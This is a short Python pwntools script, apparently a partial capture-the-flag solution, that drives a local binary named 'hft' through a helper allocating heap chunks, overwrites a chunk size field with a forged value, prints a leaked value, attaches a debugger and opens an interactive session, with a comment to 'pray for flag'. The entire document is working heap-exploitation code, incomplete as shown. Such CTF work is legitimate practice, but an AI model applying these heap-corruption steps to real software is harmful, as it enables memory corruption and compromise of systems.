from pwn import *

e = ELF('./hft')
libc = ELF('./libc.so.6')

context.binary = e

p = process(e.path)

def mal_chnk(sz, opt = 0, data = b''):
    p.sendafter(b'[PKT_RES]', p64(sz))
    p.sendline(p64(opt) + data)

    if opt == 1:
        p.recvuntil(b':[')
        return p.recvuntil(b']', drop = True)


#gdb.attach(p)

mal_chnk(0x18, data = b'a' * 0x8 + p64(0xd51))
mal_chnk(0x1008)
mal_chnk(0x68)

print(mal_chnk(0x28, opt = 1))

gdb.attach(p)

#pray for flag

p.interactive()
